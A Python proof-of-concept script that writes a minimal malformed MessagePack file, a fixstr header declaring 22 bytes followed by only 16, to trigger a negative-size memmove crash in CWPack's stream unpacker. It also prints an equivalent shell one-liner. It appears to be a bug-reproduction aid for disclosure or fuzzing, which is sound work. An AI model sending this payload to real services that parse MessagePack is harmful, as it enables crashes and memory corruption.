#!/usr/bin/env python3
"""Generate the minimal CWPack stream-unpack trigger payload.

The bug: a MessagePack blob header that declares more bytes than the stream
actually contains. Decoded through CWPack's stream unpack context, the refill
handler short-reads, the parse cursor is advanced past `end`, and the next
refill calls memmove() with a negative (huge) size.

Minimal trigger for the PoC's 16-byte unpack buffer: a fixstr header declaring
22 bytes, followed by only 16 bytes of content.

    header 0xB6 = fixstr, length (0x16 & 0x1f) = 22
    + 16 filler bytes  ->  22 declared vs 16 present  ->  6-byte overshoot

The filler byte values are irrelevant; any 16 bytes work.
"""
import sys

# 0xB6 fixstr(22) + 16 filler bytes (only the *count* matters, not the values)
PAYLOAD = bytes([0xB6]) + bytes([0xFF]) * 16


def main() -> int:
    out = sys.argv[1] if len(sys.argv) > 1 else "crash-minimal.bin"
    with open(out, "wb") as fh:
        fh.write(PAYLOAD)
    print(f"wrote {out} ({len(PAYLOAD)} bytes)")
    print("hex :", PAYLOAD.hex())
    print("Equivalent shell one-liner (no Python needed):")
    print("  printf '" + "".join(f"\\x{b:02x}" for b in PAYLOAD) + "' > crash-minimal.bin")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
